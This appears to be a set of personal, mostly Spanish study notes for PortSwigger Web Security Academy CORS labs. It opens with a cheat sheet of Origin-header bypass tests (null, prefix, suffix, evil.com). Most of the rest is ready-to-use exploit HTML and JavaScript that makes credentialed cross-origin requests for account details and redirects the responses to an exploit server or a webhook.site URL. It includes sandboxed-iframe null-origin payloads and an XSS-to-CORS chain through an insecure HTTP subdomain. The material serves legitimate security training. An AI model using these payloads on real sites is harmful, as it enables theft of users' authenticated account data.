Cheat Sheet:
- Access-Control-Allow-Credentials?
- Change the origin header to an arbitrary value
	- Origin: LoqueSea
- Change the origin header to the null value
	- Origin: null
- Change the origin header to one that begins with the origin of the site: 
	- Origin: hackersnormal-website.com
- Change the origin header to one that ends with the origin of the site.
	- Origin: normal-website.com.evil-user.net

---

1. **Prueba de Origen Arbitrario:** Añade la cabecera `Origin: [https://evil.com](https://evil.com)`. Busca que la respuesta devuelva `Access-Control-Allow-Origin: [https://evil.com](https://evil.com)` y la cabecera de credenciales a `true`.
    
2. **Prueba de Origen Nulo:** Cambia la cabecera a `Origin: null`. Muchos desarrolladores lo configuran así por error para intentar solucionar problemas con iframes locales o sandboxes.
    
3. **Prueba de Subdominios:** Envía `Origin: [https://hacker.dominio-objetivo.com](https://hacker.dominio-objetivo.com)`. Si la aplicación lo acepta, confirma que confía en comodines (`*`). Para explotarlo, necesitarás encontrar un XSS en cualquier subdominio o un _Subdomain Takeover_.
    
4. **Prueba de Sufijo (Bypass de Regex):** Intenta engañar la validación del servidor añadiendo tu dominio al final: `Origin: [https://dominio-objetivo.com.evil.com](https://dominio-objetivo.com.evil.com)`.
    
5. **Prueba de Prefijo (Bypass de Regex):** Intenta modificar el inicio del dominio para ver si la expresión regular está mal anclada: `Origin: [https://evildominio-objetivo.com](https://evildominio-objetivo.com)`.
    
6. **Prueba de Protocolo (HTTP):** Envía `Origin: [http://dominio-objetivo.com](http://dominio-objetivo.com)` (sin la 's'). Si el servidor permite HTTP, asume un riesgo de seguridad en texto plano, lo cual abre la puerta a vectores de red (aunque es menos común explotarlo en la certificación de PortSwigger).


<html>
        <body>
                <script>
   var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a6600a803b2228e800a7b2e00750095.web-security-academy.net/account-api/?unixTimestamp='+Date.now(),true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
        </body>
</html>

##### CORS Template

*  `/AccountDetails`

* Origin: `exploit-ID-EXPLOIT-SERVER.exploit-server.net` : Pa' ver si vemos reflejado el dominio del exploit, y tiramos el script en el server y deliver exploit to victim.

```html
<html>
        <body>
                <script>
   var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://ID-LAB.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
        </body>
</html>
```

* Revisar los logs. 

##### CORS when Origin allows null option

* `/AccountDetails`

* Origin: `Access-Control-Allow-Origin: null` : Pa' ver si vemos reflejado el null en la response, y entonces tiramos el ataque -> 

Algo super importante para considerar con este tipo de ataques que implementan los iframes, es mantener siempre bien estructurados los espaciados del iframe, ya que de otra forma no se ejecutaría correctamente, también para tenerlo mucho en cuenta con los ataques clickjacking que también implementan los iframes.

```html
<html>
        <body>
                <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = function(){
	location='https://webhook.site/c112fb6b-6dda-4608-a883-f330be43cbd6/log?key='+encodeURIComponent(this.responseText);
    };
    req.open('get','https://ID-LAB.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
</script>"></iframe>
        </body>
</html>

//PAYLOAD FINAL
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, 
  <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://ID-LAB.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://exploit-ID-SERVER.net/log?key='+encodeURIComponent(this.responseText);
  };
  </script>
">
</iframe>

```

##### CORS vulnerability with trusted insecure protocols

* `/AccountDetails`

* Origin: `subdomainEvil.ID-LAB.web-security-academy.net` : Cuando un subdominio puede ser añadido al CORS. 
* Para el caso puntual de este ataque en este Lab, debíamos añadir el subdominio del lab el cual era vulnerable al XSS: (en este caso `stock.ID-LAB.web-security...`)
	* Origin: `http://stock.ID-LAB.web-security-academy.net/`
	* Se supone que es trusted insecure protocols, porque la pagina se maneja en https pero el subdominio vuln a XSS se maneja en http, y así mismo lo añadimos en `Origin`

```js
//Primera parte, el script XSS a añadir en el param vuln. 
//stock.ID-LAB.web-security-academy.net/?productId=<script></script>
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a2800680416dbf0823c5ba001ef0005.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//exploit-0a2800680416dbf0823c5ba001ef0005.exploit-server.net/log?key='+this.responseText;
};
</script>
//PAYLOAD FINAL: 
//(Todo el script payload de ?productId=<script>...debe ser fielmente encoded to URL)
<script>
    document.location="http://stock.0acd00d504c52e7680f55318003a009b.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0acd00d504c52e7680f55318003a009b.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a6c003204252e8f808252ee019e002d.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>

```


